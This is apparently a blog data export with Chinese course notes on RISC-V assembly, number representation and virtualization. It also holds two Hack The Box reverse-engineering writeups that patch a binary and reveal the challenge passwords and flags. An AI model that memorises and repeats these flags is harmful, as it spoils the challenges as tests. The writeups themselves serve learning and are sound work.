注意，2个例子里分配的stack的大小是不一样的，这个主要是看ABI的具体要求，这里主要目的是示范而已。但不管大小如何，一定要保证分配的Stack大小和回收的大小是一致的。 尾递归（Tail Rekursiob）观察上面例子里stack存储的内容不难发现，如果递归的次数较高，则会很容易导致Stack Overflow。 为了解决这个问题，我们可以使用另一种递归方式：尾递归（Tail Rekursiob） 还是拿阶乘举例，我们将代码优化成这样： 1234int factorial(int n, int acc = 1) &#123; if (n == 0) return acc; return factorial(n - 1, n * acc); // 尾调用&#125; 对应的RISC-V： 123456789factorial: beqz a0, end_factorial mul a1, a0, a1 # acc = acc * n addi a0, a0, -1 # n = n-1 tail factorial # 尾调用（跳转，无需保存返回地址）end_factorial: mv a0, a1 # 返回结果 ret 这里的调用过程则会变成： 12345factorial(3, 1)→ 直接 tail call 到 factorial(2, 3)→ 再 tail call 到 factorial(1, 6)→ 再 tail call 到 factorial(0, 6)→ 结束：返回 acc = 6 栈结构如下： 12345678910+--------------------+| 当前调用（复用栈帧）|| n=3, acc=1 |→ tail call → 替换为：| n=2, acc=3 |→ tail call → 替换为：| n=1, acc=6 |→ tail call → 替换为：| n=0, acc=6 |→ return 6 不再需要存储所有中间的 n 的值。相当于是直接跳转而不是等待。 带有立即数（immediate）的命令立即数（Immediate/Konstante）：由指令本身携带，不需要从寄存器或内容中加载 aadi a = b + imm（一个立即数） 1addi a,b,&lt;imm&gt; 注意，RISC-V里是没有subi这种操作的，因为它可以被addi代替： subi a,b,x是等价于addi a,b,-x的（这里的x是一个立即数/常数）。 但sub不可以被add替代，是因为sub a,b,-c这个操作不合规（c是一个register，不存在-c这种操作）。 这里可以使用的立即数的大小会被限制在$[-2^{11},2^{11}) = [-2048,+2047]$ （具体原因会在之后机器码的部分阐述） 生成32-Bit的常数： 需要用到 load upper immediate (lui) 和 addi lui 的作用是将一个常数加载到目标寄存器的高 20 位（也就是5Bytes），并将低 12 位（4Bytes）填充为 0。 而addi则负责将低 12 位（4Bytes）的数值加到目标寄存器中。 例子： C: 1int a = 0xFEDC8765; 对应的汇编： 123# s0 = alui s0, 0xFEDC8 # s0 = 0xFEDC8000addi s0, s0, 0x765 RISC-V 机器码 Machine Code/Instrunction将汇编语言翻译成机器码主要依靠下面这2张表： 首先，所有的操作会被分成6个大类： Register/register (R) Immediate (I) Upper immediate (U) Store (S) Branch (B) 条件跳转 Jump (J) 然后会通过funct3以及funct7确定具体操作。（funct7更多的是为了扩展的操作/功能。） rs1, rs2, rd存储的是寄存器的地址，而imm存储的则是立即数（immediate）的数值。其中rd是目标寄存器。 例子： 1addi a1, a2,1 假设a1（rd），a2（rs1）的地址为00010，01010， 因为addi指令的opcode和funct3为：0010011, 000 ，这行命令会翻译成以下的机器码： 123imm[11:0] | rs1 | funct3 | rd | opcode------------|-------|--------|-------|--------000000000001| 01010 | 000 | 00010 | 0010011 S,T,J 那部分内容将imm的值拆成好几部分是为了其他内容的位置可以对齐，比如说rs2的位置都是第20-24bit。 Branch和Jump都是跳转操作，所以会将imm（跳转地址）的第一位（符号位）imm[12]或者imm[20]放在开头，以确定是向后跳转还是向前。然后因为RISC-V的命令都是32位的，也就是4Byte，所以所有地址都是4的倍数，也就不需要imm[0]的信息了，因为imm[0]始终等于0。 例题1. Register s5 nullen 将寄存器s5的值设为0：123mov s5, 0#或者是li s5, 0 2. Wert in Register a1 nach s3 kopieren 将s3的值复制到s1里：1mv s3, a1 3. Dasunterste Bit von a0 nach t1 schreiben, restliche Bits sollen 0 sein 将 a0 的最低位写入 t1，其他位清零:1andi t1, a0, 1 1在二进制中只有最后一位是1，其他位置都是0，所以a0的其他位置与0进行and操作都会得到0，而最后一位与1进行and操作会保留原本内容。 4. Register s1 mit Einsen füllen 将寄存器 s1的值为全都是 1：1li s1, -1 因为-1 的二进制表示全 1 5. Unterstes Byte von t0 nach a0 schreiben, Rest unverändert 将 t0 的最低字节写入 a0，保持其余部分不变：12andi a0, a0, -256 # 清除 a0 的最低字节 (0xFFFFFF00)or a0, a0, t0 # 直接合并 t0 低字节 -256的二进制表示为 11111 1111 1111 1111 1111 1111 0000 0000 最后一个Byte的内容都是0，所以将它与a0进行and操作可以清除a0的最后一个Byte的内容，前面的保留。 然后将a0和t0直接进行or操作，会保留a0的前面部分，以及t0的最后一个Byte的内容。","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA 计算机体系结构","slug":"TUM课程笔记/ERA-计算机体系结构","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/tags/Rechnerarchitektur/"},{"name":"计算机体系结构","slug":"计算机体系结构","permalink":"https://archer-baiyi.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"汇编语言","slug":"汇编语言","permalink":"https://archer-baiyi.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"RISC-V","slug":"RISC-V","permalink":"https://archer-baiyi.github.io/tags/RISC-V/"}]},{"title":"1 Einführung und Datenrepräsentation","slug":"TUM笔记/ERA/ERA-1-Einfuhrung-und-Datenreprasentation","date":"2025-03-18T12:12:02.000Z","updated":"2025-03-25T19:32:44.477Z","comments":true,"path":"2025/03/18/TUM笔记/ERA/ERA-1-Einfuhrung-und-Datenreprasentation/","permalink":"https://archer-baiyi.github.io/2025/03/18/TUM%E7%AC%94%E8%AE%B0/ERA/ERA-1-Einfuhrung-und-Datenreprasentation/","excerpt":"计算机体系结构基础相关笔记","text":"Einführung in die Rechnerarchitektur (ERA)DatendarstellungenZahlensystemeDezimalsystem Binärsystem Hexadezimalsystem Gängige Wortlängen Negative Ganze Zahlen假如专门用一个Bit来表示正负号（比如说)，这样子做会带来一个问题： 0 = 1+(-1) \\Longleftrightarrow 0000 0000 = 1000 0001 + 0000 0001 = 1000 0000所以一般使用Zweierkomplement，即Invertierung (Einerkomplement) + 1。 例子： 这样做的好处就是加法会非常自然： -1 + 1 = 1111 1111 + 0000 0001 = 1 0000 0000 \\rightarrow 0000 0000 = 0","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA 计算机体系结构","slug":"TUM课程笔记/ERA-计算机体系结构","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/tags/Rechnerarchitektur/"},{"name":"计算机体系结构","slug":"计算机体系结构","permalink":"https://archer-baiyi.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}]},{"title":"HTB_rev Find The Easy Pass Writeup","slug":"CTF/Reverse Engineering/HTB-rev-Find-The-Easy-Pass-Writeup","date":"2025-03-16T21:39:15.000Z","updated":"2025-04-02T21:32:57.935Z","comments":true,"path":"2025/03/16/CTF/Reverse Engineering/HTB-rev-Find-The-Easy-Pass-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/16/CTF/Reverse%20Engineering/HTB-rev-Find-The-Easy-Pass-Writeup/","excerpt":"","text":"这道题会给我们一个exe文件，打开是一个判断输入的密码是否正确的软件： 我们用IDA打开它，会发现并没有反编译出main()函数。所以我们随便输入一点内容试一下： 会返回Wrong Password!字样。接着我们尝试用IDA搜索这段内容，会发现： 点击第二个结果会跳转到： 注意到它的上方有着”Goob Job. Congratulation”的字样，我们猜测这是输入成功后返回的内容，所以我们点击它下方 XREF的内容，查看这个变量在哪里被调用过，通过反汇编会得到以下内容：12345678910111213141516171819202122232425262728293031323334353637383940414243int __fastcall TForm1_Button1Click(int a1)&#123; int v2; // ecx int v3; // edx char v4; // zf unsigned int v6[2]; // [esp-Ch] [ebp-38h] BYREF int *v7; // [esp-4h] [ebp-30h] int v8; // [esp+4h] [ebp-28h] BYREF int v9; // [esp+8h] [ebp-24h] BYREF int v10; // [esp+Ch] [ebp-20h] BYREF int v11; // [esp+10h] [ebp-1Ch] BYREF int v12; // [esp+14h] [ebp-18h] BYREF int v13; // [esp+18h] [ebp-14h] BYREF int v14; // [esp+1Ch] [ebp-10h] BYREF int v15; // [esp+20h] [ebp-Ch] BYREF int v16; // [esp+24h] [ebp-8h] BYREF int v17; // [esp+28h] [ebp-4h] BYREF int savedregs; // [esp+2Ch] [ebp+0h] BYREF v7 = &amp;savedregs; v6[1] = (unsigned int)&amp;loc_454171; v6[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v6); System::__linkproc__ LStrLAsg(&amp;v16, &amp;str_f[1]); System::__linkproc__ LStrLAsg(&amp;v15, &amp;str_o[1]); System::__linkproc__ LStrLAsg(&amp;v14, &amp;str_r[1]); System::__linkproc__ LStrLAsg(&amp;v13, &amp;str_t[1]); System::__linkproc__ LStrLAsg(&amp;v12, &amp;str_r[1]); System::__linkproc__ LStrLAsg(&amp;v11, &amp;str_a[1]); System::__linkproc__ LStrLAsg(&amp;v10, &amp;str_n[1]); System::__linkproc__ LStrLAsg(&amp;v9, &amp;str___13[1]); System::__linkproc__ LStrCatN(&amp;v17, 8, v2, v15, v14, v13, v12, v11, v10, v9); Controls::TControl::GetText(*(Controls::TControl **)(a1 + 760)); System::__linkproc__ LStrCmp(v8, v17); if ( v4 ) Dialogs::ShowMessage((Dialogs *)&amp;str_Good_Job__Congr[1], v3); else Dialogs::ShowMessage((Dialogs *)&amp;str_Wrong_Password_[1], v3); __writefsdword(0, v6[0]); v7 = (int *)&amp;loc_454178; System::__linkproc__ LStrClr(&amp;v8); return System::__linkproc__ LStrArrayClr(&amp;v9, 9);&#125; 这段代码的主要逻辑是将这些赋值变量 123456789System::__linkproc__ LStrLAsg(&amp;v16, &amp;str_f[1]);System::__linkproc__ LStrLAsg(&amp;v15, &amp;str_o[1]);System::__linkproc__ LStrLAsg(&amp;v14, &amp;str_r[1]);System::__linkproc__ LStrLAsg(&amp;v13, &amp;str_t[1]);System::__linkproc__ LStrLAsg(&amp;v12, &amp;str_r[1]);System::__linkproc__ LStrLAsg(&amp;v11, &amp;str_a[1]);System::__linkproc__ LStrLAsg(&amp;v10, &amp;str_n[1]);System::__linkproc__ LStrLAsg(&amp;v9, &amp;str___13[1]); 拼接成一个新的字符串 v17 1System::__linkproc__ LStrCatN(&amp;v17, 8, v2, v15, v14, v13, v12, v11, v10, v9); 然后比较输入的字符串与v17。所以我们只需要查看那些赋值字符串的具体值便可得到密码：fortran! 按照题目要求flag内容为：HTB{fortran!}。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Reverse Engineering","slug":"CTF/Reverse-Engineering","permalink":"https://archer-baiyi.github.io/categories/CTF/Reverse-Engineering/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://archer-baiyi.github.io/tags/Reverse-Engineering/"}]},{"title":"HTB_rev Behind the Scenes Writeup","slug":"CTF/Reverse Engineering/HTB-rev-Behind-the-Scenes-Writeup","date":"2025-03-12T01:22:42.000Z","updated":"2025-04-02T21:33:08.443Z","comments":true,"path":"2025/03/12/CTF/Reverse Engineering/HTB-rev-Behind-the-Scenes-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/12/CTF/Reverse%20Engineering/HTB-rev-Behind-the-Scenes-Writeup/","excerpt":"","text":"用010 Editor （或者Hex Editor之类的都行）打开源文件，将里面所有的 0F 0B （即 ud2 ）改为 90 90 （90即NOP，是Machine Code中表示 无操作 (No Operation) 的命令），然后再用IDA打开文件即可看到完整的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051int __fastcall main(int argc, const char **argv, const char **envp){ struct sigaction s; // [rsp+10h] [rbp-A0h] BYREF unsigned __int64 v5; // [rsp+A8h] [rbp-8h] v5 = __readfsqword(0x28u); memset(&amp;s, 0, sizeof(s)); sigemptyset(&amp;s.sa_mask); s.sa_handler = (__sighandler_t)segill_sigaction; s.sa_flags = 4; sigaction(4, &amp;s, 0LL); if ( argc == 2 ) { if ( strlen(argv[1]) == 12 ) { if ( !strncmp(argv[1], \"Itz\", 3uLL) ) { if ( !strncmp(argv[1] + 3, \"_0n\", 3uLL) ) { if ( !strncmp(argv[1] + 6, \"Ly_\", 3uLL) ) { if ( !strncmp(argv[1] + 9, \"UD2\", 3uLL) ) printf(\"&gt; HTB{%s}\\n\", argv[1]); return 0; } else { return 0; } } else { return 0; } } else { return 0; } } else { return 0; } } else { puts(\"./challenge &lt;password&gt;\"); return 1; }} 所以flag为 1HTB{Itz_0nLy_UD2}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Reverse Engineering","slug":"CTF/Reverse-Engineering","permalink":"https://archer-baiyi.github.io/categories/CTF/Reverse-Engineering/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://archer-baiyi.github.io/tags/Reverse-Engineering/"}]},{"title":"GBS 9 Virtualisierung 虚拟化","slug":"TUM笔记/GBS/GBS-9-Virtualisierung-虚拟化","date":"2025-03-11T17:17:37.000Z","updated":"2025-03-25T19:33:18.158Z","comments":true,"path":"2025/03/11/TUM笔记/GBS/GBS-9-Virtualisierung-虚拟化/","permalink":"https://archer-baiyi.github.io/2025/03/11/TUM%E7%AC%94%E8%AE%B0/GBS/GBS-9-Virtualisierung-%E8%99%9A%E6%8B%9F%E5%8C%96/","excerpt":"操作系统基础相关笔记","text":"Einführung Abstraktionssichten: 复杂系统可以通过抽象层更好地描述。 Fokus auf relevante Funktionalitäten 抽象层通过接口（Interfaces）相互分离（durch Schnittstellen (Interfaces) voneinander getrennt）： 使得每一层可以独立开发和实现，并且高层系统只需要与接口交互，而不需要了解底层实现。 z.B. Systemcalls: Implementierung durch Interface verborgen ： 只需要直接用read(), write()这些命令，不需要关注/知道这些调用在内核中的具体实现。 Interfaces können die Software Sicht auf die Hardware definieren ：软件可以通过接口来访问硬件，而无需直接操作硬件。 Interfaces Instruction Set Architecture (ISA): 指令集架构 Interface zwischen dem BS und Hardware 是操作系统与硬件之间的接口 besteht aud User- und System-ISA Application Binary Interface (ABI): 应用二进制接口 Interface zwischen Anwendungen und dem Betriebssystem 是应用程序与操作系统之间的接口 besteht aus dem System Call Interface und der User ISA Die Sicht auf das System hängt von der Software-Perspektive ab： 如果是开发操作系统的话，则需要考虑操作系统与硬件的交互接口（isa）； 而如果是开发普通软件的话，则更关注软件与操作系统的接口（abi），相当于通过操作系统来访问硬件。 Ein Hardware-System (physische Maschine) bietet eine Laufzeitumgebung für die darüberliegende Software： BS virtualisiert bereits: Prozesse, virtueller Speicher und Abstraktionen Eine Virtuelle Maschine implementiert eine virtuelle Laufzeitumgebung： Abbilden von virtuellen auf physische Ressourcen 虚拟运行环境的分类 System Virtual Machines（系统虚拟机） 虚拟化整个系统 Process Virtual Machines（进程虚拟机） 仅为单个进程提供虚拟环境 Anforderungen an Virtualisierung 对虚拟化的要求 Equivalences / Fidelity：等效性 虚拟化应该让操作系统和应用程序无需特殊修改（或者最小程度的改动）便可以在虚拟机上运行。 Resource Control / Safety (Isolation)： 隔离性 必须确保虚拟机（的资源）彼此不会影响；Hypervisor需要控制所有底层资源 Efficiency / Performance：性能 大部分指令应该直接在硬件上执行 系统虚拟机 （System Virtual Machines）我们为什么需要系统虚拟机？ 模拟（Emulation） 使得操作系统可以在不同的 ISA上运行，并且在虚拟机中调试操作系统通常比在物理硬件（裸机）上更方便。 隔离（Isolation） 受损或遭到攻击的 Guest OS 无法影响其他虚拟机，也无法修改 Hypervisor 本身。 安全性（Sicherheit） Hypervisor 更容易保护（代码量较小、权限较高）。 资源利用（Ressourcennutzung） 物理硬件资源可以更好（更灵活）地分配和利用。 Hypervisor / Virtual Machine Monitor (VMM) 虚拟机监控器Hypervisor负责给操作系统提供运行环境，通常会分为2类： Typ 1 Hypervisor /Bare-Metal-Hypervisor （裸机式） 直接在物理硬件上运行容器，没有额外虚拟化层的存在。这种方式的主要优点在于性能的极致优化，因为没有虚拟化带来的开销。 比如 Xen, Hyper-V, VMware ESX。 Typ 2 Hypervisor （托管式） 依赖于宿主操作系统的服务（ Verwendet Dienste des Host-BS）。 比如 KVM, VirtualBox, VMware Workstation。 Hypervisor实现了一个虚拟的 ISA，同样分User- 和 System-ISA。 Hypervisor虚拟化整个物理机器，并且提供虚拟化硬件作为借口让Gast-BS可以在上面运行。可以使得Gast-BS以为/产生错觉（Illusion）自己对硬件拥有完整的控制权。但实际上对于Hypervisor来说，Gast-BS就只是个软件而已。 这样做的好处就是一个虚拟机可以运行任意操作系统，并且可以同时运行多个相同或不同的操作系统。 Hypervisor 负责控制和虚拟化系统的硬件资源： CPU 虚拟化（CPU-Virtualisierung） 内存虚拟化（Speicher-Virtualisierung） I/O 虚拟化（I/O-Virtualisierung） 并需要确保Gast-BS不能访问未分配给它的资源。 CPU 虚拟化（CPU-Virtualisierung）CPU 的虚拟化方法一般是分以下3种： 半虚拟化（Paravirtualization）： 使用经过修改的操作系统 在虚拟机（VM）中运行，该 OS 知道自己处于虚拟化环境中。 设备驱动程序（Geräte Treiber）会通过 Hypercalls 与Hypervisor进行交互。 二进制翻译（Binary Translation）： 可以运行未经修改的操作系统，甚至可以在不同架构上运行（例如 x86 上模拟 ARM）。 Hypervisor会解释/模拟Gast-BS的部分二进制代码，所以会导致性能开销（Performance-Overhead） 这种Hypervisor的实现非常复杂。 硬件辅助虚拟化（Hardware-assisted Virtualization） 可以运行未经修改的操作系统，可以实现高效的虚拟机（effizienten VMs），减少性能损失。所以是目前最主流的。 与普通操作系统中的内核空间（Kernel Space）与用户空间（User Space）不同（但相似）的是，我们这里会讨论的是高权限的 系统模式（System Mode） 和 用户模式（User Mode）。Hypervisor 会在系统模式（System Mode）运行，而Guest-BS则是会在用户模式（User Mode）运行。 某些在用户模式下执行的指令会被 Hypervisor 在系统模式下拦截，以确保Hypervisor 拥有对虚拟机的完全控制。 （套娃，User Mode里又有Virtual User Mode 和Virtual System Mode。） ISA中的指令可以分为以下3类： 特权指令（Privileged Instructions）： 只能在系统模式（System Mode）下执行。 如果在用户模式（User Mode）下执行，则会触发陷阱（Trap），由 Hypervisor 处理。 敏感指令（Sensitive Instructions）： 其中又分为 控制敏感指令（Control-Sensitive Instructions）：将修改系统配置（例如 修改页表（Page Tables）） 与行为敏感指令（Behaviour-Sensitive Instructions）：这些指令在不同模式下（用户模式 vs. 系统模式）的行为也是不同的。 无害指令（Innocuous Instructions）： 不属于前2类的则都属于这类。 虚拟化需要确保其中的敏感指令（Sensitive Instructions）必须是特权指令（Privileged Instructions）的子集。 反例可以参考x86架构中的POPF 指令（从栈加载标志寄存器 Flags）。 内存虚拟化（Speicher-Virtualisierung）在正常的非虚拟化情况下，操作系统（OS） 会直接管理物理内存并分配给不同的进程，利用前面学到的Seitentabelle(Page Table)。但在虚拟化的情况下，Hypervisor 需要作为最高管理者（übergeordnete Instanz）负责内存资源分配，确保Gast-BS不能随意访问物理内存且只能“看到”分配给它的部分。 下面介绍内存虚拟化的2中方法： 影子页表（Shadow Page Table, SPT） 硬件辅助的二级地址转换（Second Level Address Translation, SLAT） 影子页表（Shadow Page Table, SPT）在这个方法里一共存在三个内存抽象层： 物理内存 （Host-Physische Adressen, HPA） Hypervisor 对物理内存的抽象 即分配给Gast-BS的内存 （Gast-Physische Adressen）。这些内存对于Gast-BS来说是连续的，但是在实际的物理内存里不一定连续。 虚拟内存（ Virtueller Speicher） Guest OS 维护自己的页表（这些页表 不会 被 MMU（内存管理单元） 直接使用。），而Hypervisor维护影子页表（SPT）。为了保持页表的同步，Gast-BS只能以只读（Read-Only）方式访问它的页表，任何写入页表的尝试都会被 Hypervisor 拦截（Trap），让Hypervisor好更新Gast-BS的页表与SPT。 相当于影子页表是中间的那层页表。 SPT的问题也很显而易见：管理起来非常复杂而且开销很高（hoher Overhead）。 二级地址转换（Second Level Address Translation, SLAT）SLAT 由 CPU 提供硬件支持，将Gast-BS看到的 Gast 物理地址 (Gast-Physische Adressen) 映射到主机物理地址 (HPA)。Hypervisor 仅在 Guest OS 访问未映射的地址时才介入，减少性能开销。 例子： Intel Extended Page Tables (EPT), AMD Nested Page Tables (NPT) 虚拟机的内存管理跟进程管理的内存分配问题类似，我们也需要考虑该给每台虚拟机分配多少内存。 静态分配会导致不灵活，占用固定资源的问题。 动态分配的原理则是过量分配（Overcommitment）（假设并非所有 VMs 同时需要全部已分配的内存。）但这样会在回收已分配的内存时碰到问题，因为Hypervisor 无法知道哪些内存页是重要的，哪些可以释放。 为了解决这个问题我们可以使用 Ballooning (“balloon driver”)：Gast-BS内部的软件与Hypervisor进行通信：（没有内存压力的虚拟机）释放内存（“气球放气”）；申请内存（”给气球充气“）。 I/O 虚拟化（I/O-Virtualisierung）介绍几种I/O 虚拟化的技术： 完整虚拟化/仿真（Full Virtualization/Emulation）Hypervisor管理所有 Guest VM 的I/O请求，调度I/O资源。 Hypervisor 通过软件多路复用（multiplext）或仿真（emuliert）I/O 设备。 Hypervisor会拦截Guest VM的I/O请求，并将其转发到物理 I/O 设备。 优势： 高效 Gemultiplexte I/O-Geräte sind effizient； 透明 Transparentes Geräte-Management。 问题： 实现起来太复杂； Hypervisor 需要为多种 I/O 设备提供驱动程序。； 如果 I/O 设备完全仿真（Emulation），会产生较高的性能开销（Overhead）。 半虚拟化（Paravirtualization）将 I/O 设备驱动分为两部分 使用拆分驱动架构（Split-Driver-Architektur） 后端驱动（Backend-Treiber）：运行在 Hypervisor 或 I/O 处理 VM 内，实际管理物理设备。 前端驱动（Frontend-Treiber）：运行在 Gast-BS 内，与后端驱动通信。 优势： 开销更低（Geringer Overhead）； 更容易实现； Guest OS 适配更灵活，可以通过 已有驱动支持新设备。 问题： Guest OS 需要额外修改或安装特定驱动。 设备域（Device Domains）一台VM充当所有I/O设备的接口（在Xen中称为Domain 0或”dom0”），其他VMs通过这台VM访问I/O设备，而不是直接访问硬件。 直接 I/O 访问（Direct I/O）使用硬件支持的 I/O 设备多路复用（Multiplexing）。 I/O-MMU（I/O 内存管理单元） 负责管理 Guest VM 的设备内存： 负责 I/O 地址和中断（Interrupt）的映射。 隔离 DMA（直接内存访问）请求，防止 VMs 互相干扰。 优势： Guest VM 直接访问物理设备，提高 I/O 效率。 部分 I/O 处理由硬件完成，减少 Hypervisor 负担。 单根 I/O 虚拟化（Single Root I/O Virtualization, SR-IOV）I/O 设备本身支持虚拟化，将 一个物理设备拆分为多个虚拟功能（ Virtual Functions，VF），会绕过Hypervisor的I/O处理。 Gast VM 看到的是一个独立的 I/O 设备，但实际上它共享了同一个物理设备。 （感觉大部分虚拟化的技术都是通过减轻Hypervisor的负担来提高效率的） 进程虚拟机（Process Virtual Machines）跟系统虚拟机不同的是，进程虚拟机（Process VM）只给单个（或者多个）进程提供虚拟运行环境，使应用程序可以独立于底层操作系统和硬件架构运行。 Runtime会给用户空间进程（User-Space-Prozesse）提供虚拟运行环境，并且负责实现 ABI接口（由系统调用接口（Systemcall Interface）和用户指令集架构（User-ISA）组成）。简单来讲就是Runtime需要负责转换/翻译Systemcall和ISA的指令。 对应用程序来说，整个“系统”由 ABI 接口决定，而不依赖底层硬件或操作系统。 Runtime是类似于Hypervisor的中间层，但他们的核心作用之类的完全不一样。 进程虚拟机的优势： 仿真（Emulation）：程序可以在不同 ISA（指令集架构）上运行。 平台无关性（Plattform-Unabhängigkeit）：程序可以在不同 OS 运行。 性能优化（Performance-Optimierung）：二进制优化器（Binary Optimizer）会优化代码。 高级语言虚拟机（High-Level-Language VMs, HLL VMs）作为进程虚拟机的一种，会提供一个与底层架构无关的虚拟 ISA（ Plattform-unabhängige virtuelle ISA），使得应用程序不依赖特定的操作系统（OS）和硬件架构。主要是为了运行高级编程语言的代码。 比如说 Java Virtual Machine (JVM) 可以解释和执行 Java 字节码（Java Bytecode），让 Java 代码可以在 Windows、Linux、Mac 等不同平台 上运行。 如果多个进程需要共享资源并相互交互（interagieren），则通常使用操作系统级虚拟化（OS-level Virtualization）。 操作系统级虚拟化（OS-level-Virtualization）操作系统级虚拟化（OS-level-Virtualization）可以运行多个隔离的应用进程，共享同一个操作系统（OS）。 Container Leichtgewichtige Virtualisierungsmöglichkeit 轻量化 stellen eine Laufzeitumgebung für User-Space-Prozesse bereit BS wird nicht virtualisiert Isolation von Prozessen möglich Container是OS-Level Virtualization的一种实现。 在传统的 Unix 操作系统中，一些资源是全局管理的，比如说PID, UID (User ID), IP-Addresse, Host- und NIS-Domainnamen，使得具有 root 权限的进程可以访问和影响其他进程，带来安全隐患。所以希望将他们隔离开。 Namespaces 是 Container 的基础：抽象出对系统全局资源的访问 （比如说Filesystem-Mount-Points, Netzressourcen, PIDs, etc.），将所有进程拆成disjoint subsets，使得每个subset里的进程会认为自己是整个系统中唯一的进程。 Jede Ressource ist eindeutig innerhalb eines Namespace-Containers Bestandteile von Container unter LinuxNamespaces作用：Benennung und Adressierung von Ressourcen，实现进程级别的资源隔离。 主要负责隔离。 在实际应用中，我们不总是需要隔离所有系统资源。因此，Linux 提供了多个独立的 Namespace，以实现更灵活的隔离方式，并避免不必要的资源浪费： UTS: Unix Time Sharing (System) Isolieren System-Identifier (z.B.Host- und Domainnamen 主机名和域名) 例如，在 Docker 容器中，每个容器可以拥有自己的主机名，而不会影响宿主机。 IPC: Inter-Process Communication isolieren IPC-Ressourcen 隔离进程间通信、 例如，不同的容器不能访问彼此的共享内存和消息队列，提高安全性。 Network: isolieren Netzressourcen 隔离网络设备、IP 地址、端口、路由表等，允许不同 Namespace 拥有独立的网络栈。 PID: isolieren PID-Räume Prozesse in unterschiedlichen PID-Namespaces können dieselbe PID haben, aber eindeutig innerhalb eines PID-Namespace Es können verschachtelte (engl. nested) PID-Namespaces erstellt werden 可以套娃 在同一 PID 命名空间内，进程可以正常通信；在不同 PID 命名空间之间，父 Namespace 可以向子 Namespace 发送信号，但子 Namespace 不能影响父 Namespace。 Mount: isolieren Mount-Points des Dateisystems 隔离文件系统挂载点，允许不同的 Namespace 看到不同的文件系统视图。 （在 Linux 中，挂载点（Mount Point） 是指将一个文件系统连接到目录结构中的特定位置，使其内容可以通过该目录访问。） 挂载类型 (Mount-Typ)： Shared Mount 共享挂载：接收+传递 该挂载点的 mount 和 umount 事件会在 Peer Group 之间传播。 例如，在 Shared Mount 上挂载一个新目录，所有共享该挂载点的进程都会看到这个变更。 Private Mount 私有挂载：不接收+不传递 挂载点不会接收，也不会向对等组（Peer Groups）传递事件。 Der Mount-Point empfängt und leitet keine Events zu Peer Groups weiter. Slave Mount 从属挂载：接收+不传递 Slave-Mount-Points empfangen Events von einer Master Peer Group. Unbinable Mount 不可绑定挂载： Ist ein Private Mount, der nicht gebunden (Bind Mount) werden kann. 不能被绑定的私人挂载。 (Bind Mount指的是允许将一个目录或文件挂载到另一个位置，使其在多个路径下可见。) Peer Groups（对等组）：Peer Group 是一组共享 mount 事件的挂载点，当一个 Shared Mount 被创建时，它会被添加到某个 Peer Group。所有 Peer Group 内的挂载点都会同步 mount 和 umount 事件。 User: isolieren User- und Group-IDs 隔离用户 ID 和权限 Erhöhte Privilegien sind nur innerhalb des User Namespace gültig. können auch verschachtelte User-Namespaces erstellt werden. 套娃 例如，容器内的 root 实际上是宿主机的普通用户，增强安全性。 Linux Control Groups (cgroups)主要负责限制。 作用： cgroups unterteilen Prozesse in hierarchische Gruppen 将进程划分为层次化的组 分配( Allozieren )和分发( verteilen )每一组的系统资源 （CPU, 内存等） 资源由独立的 cgroup 子系统表示 Jedes Subsystem verwaltet eine Hierarchie an Prozessgruppen Accounting Überwacht Seiten, die von den Prozessgruppen verwendet werden 监控进程使用的内存 Kontrolle weiche Speichergrenzen 确保内存页会被回收（但不是强制的，即在系统压力下会优先释放，但不会立即强制回收） harte Speichergrenzen 会触发 Out-of-Memory-Killer 所有该 cgroup 内的进程会被冻结。 OOM Killer 可能会终止进程或调整内存限制。 如果内存使用量下降到限制以下，进程可以恢复运行。 Secure Computing Mode (Seccomp)用于限制进程可以执行的系统调用（System Calls）。 提供 3 种模式： Disabled： 未启用，可以调用所有 System Call Strict： 只能调用4个：read(), write(), exit() 和 sigreturn() （sigreturn() 是一个 系统调用（syscall），用于 从信号处理程序（signal handler）返回到被中断的进程上下文。） 调用其他的会触发SIGKILL信号。 Filter： 只能使用被过滤过的System Call。 Filter会基于Berkeley Packet Filter (BPF)。 库操作系统（Library OS）其实虚拟机（VM）和Container还是有些问题的： 通用性（Universell）：内核（Kernel）并未针对特定应用进行优化。 额外开销（Overhead）：包含未使用的组件，带来以下问题： 